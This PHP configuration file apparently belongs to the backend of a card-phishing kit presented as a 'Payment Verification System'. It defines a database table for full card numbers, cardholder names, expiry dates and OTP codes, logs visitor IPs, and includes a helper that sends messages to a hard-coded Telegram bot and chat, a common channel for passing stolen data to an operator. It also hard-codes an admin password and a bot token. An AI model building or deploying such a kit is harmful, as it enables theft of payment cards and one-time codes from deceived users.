<?php
// Database Configuration
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASSWORD', '');
define('DB_NAME', 'payment_app');

// Telegram Configuration
define('TELEGRAM_BOT_TOKEN', '8332648469:AAG0nSTVcu5DuLsvXEGa0cr5MV_Ae7BB4_g');
define('TELEGRAM_CHAT_ID', '-4843141531');

// Google reCAPTCHA Configuration
define('RECAPTCHA_SITE_KEY', '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI');
define('RECAPTCHA_SECRET_KEY', '6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe');

// Application Settings
define('APP_NAME', 'Payment Verification System');
define('APP_URL', 'http://' . $_SERVER['HTTP_HOST']);
define('ADMIN_PATH', '/admin.php');
define('ADMIN_PASSWORD', 'admin12345');

// Session Configuration
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
define('SESSION_LIFETIME', 3600);

// Error Handling
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/error.log');

// CORS & Security Headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
header('Content-Security-Policy: default-src \'self\'; script-src \'self\' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/');

// Database Connection
try {
    $db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
    
    if ($db->connect_error) {
        throw new Exception('Database connection failed: ' . $db->connect_error);
    }
    
    $db->set_charset('utf8mb4');
} catch (Exception $e) {
    error_log('Database Error: ' . $e->getMessage());
    if (strpos($_SERVER['REQUEST_URI'], 'api.php') !== false) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'message' => 'Database error']);
        exit;
    }
    die('System error. Please try again later.');
}

// Helper Functions
function sendTelegramMessage($message) {
    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'timeout' => 5
        ]
    ];
    
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    
    if ($response === false) {
        error_log('Telegram API Error: Failed to send message');
        return false;
    }
    
    $result = json_decode($response, true);
    if (!isset($result['ok']) || !$result['ok']) {
        error_log('Telegram Error: ' . json_encode($result));
        return false;
    }
    
    return true;
}

function verifyRecaptcha($token) {
    $url = 'https://www.google.com/recaptcha/api/siteverify';
    
    $data = [
        'secret' => RECAPTCHA_SECRET_KEY,
        'response' => $token
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'timeout' => 5
        ]
    ];
    
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    
    if ($response === false) {
        return false;
    }
    
    $result = json_decode($response, true);
    return isset($result['success']) && $result['success'] && $result['score'] > 0.5;
}

function sanitizeInput($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function generateOTP() {
    return str_pad(mt_rand(0, 999999), 6, '0', STR_PAD_LEFT);
}

function generateSessionId() {
    return bin2hex(random_bytes(16));
}

function logVisitor($action, $data = []) {
    global $db;
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = sanitizeInput($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');
    $actionLog = sanitizeInput($action);
    $dataJson = json_encode($data);
    $timestamp = date('Y-m-d H:i:s');
    
    $query = "INSERT INTO visitor_logs (ip_address, user_agent, action, data, timestamp) 
              VALUES (?, ?, ?, ?, ?)";
    
    $stmt = $db->prepare($query);
    if ($stmt) {
        $stmt->bind_param('sssss', $ip, $userAgent, $actionLog, $dataJson, $timestamp);
        $stmt->execute();
        $stmt->close();
    }
}

function json_response($data) {
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

function redirect($url) {
    header('Location: ' . $url);
    exit;
}

function isSessionValid() {
    if (!isset($_SESSION['admin_logged_in'])) {
        return false;
    }
    
    $lifetime = SESSION_LIFETIME;
    if (time() - $_SESSION['admin_login_time'] > $lifetime) {
        session_destroy();
        return false;
    }
    
    $_SESSION['admin_login_time'] = time();
    return true;
}

// Initialize database tables
function initializeDatabase() {
    global $db;
    
    $db->query("CREATE TABLE IF NOT EXISTS transactions (
        id INT AUTO_INCREMENT PRIMARY KEY,
        session_id VARCHAR(255) UNIQUE NOT NULL,
        card_number VARCHAR(20) NOT NULL,
        cardholder_name VARCHAR(255) NOT NULL,
        email VARCHAR(255) NOT NULL,
        expiry_date VARCHAR(10) NOT NULL,
        otp_code VARCHAR(6),
        otp_verified BOOLEAN DEFAULT FALSE,
        ip_address VARCHAR(45),
        status ENUM('pending', 'verified', 'failed') DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        verified_at TIMESTAMP NULL,
        INDEX idx_session (session_id),
        INDEX idx_status (status)
    )");
    
    $db->query("CREATE TABLE IF NOT EXISTS visitor_logs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        ip_address VARCHAR(45),
        user_agent TEXT,
        action VARCHAR(255),
        data JSON,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_ip (ip_address),
        INDEX idx_action (action)
    )");
}

initializeDatabase();
?>
